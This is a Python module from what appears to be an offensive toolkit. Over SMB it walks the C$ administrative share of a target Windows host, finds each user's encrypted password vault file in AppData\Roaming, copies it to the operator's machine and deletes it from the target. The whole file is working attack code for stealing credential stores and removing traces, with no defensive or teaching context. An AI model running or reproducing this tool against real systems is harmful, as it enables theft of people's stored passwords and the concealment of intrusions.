#!/usr/bin/python3

from axiom_keepass.core.parse_args import AxiomArgParser
from axiom_keepass.client.download import download

def pull(smbClient, silent=False):
    users_folder = smbClient.listPath("C$", r"\Users\*")
    for f in users_folder:
        if f.is_directory() and f.get_longname() != "." and f.get_longname() != "..":
            if not silent:
                print(f"[+] Searching in {f.get_longname()}")

            try:
                target = AxiomArgParser.GetProgramArgs().target.split('@')[1]
                result = smbClient.listPath("C$", f"\\Users\\{f.get_longname()}\\AppData\\Roaming\\axiomvault.enc")
                if result is not None:
                    print(f"[+] Found a vault! File size is {result[0].get_filesize()} bytes")
                    download(
                            smbClient,
                            f"\\Users\\{f.get_longname()}\\AppData\\Roaming\\axiomvault.enc",
                            f"./{target}_{f.get_longname()}_axiomvault.enc"
                    )
                    
                    try:
                        smbClient.deleteFile("C$", f"\\Users\\{f.get_longname()}\\AppData\\Roaming\\axiomvault.enc")
                        print(f"[+] Vault deleted from {target}")
                    except:
                        print(f"[-] Failed to delete the vault from {target}, remember to do it manually")

            except Exception as e:
                if "STATUS_STOPPED_ON_SYMLINK" in str(e):
                    continue
                elif "STATUS_NO_SUCH_FILE" in str(e):
                    continue
                elif "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                    continue
                else:
                    print(f"[-] {str(e)}")

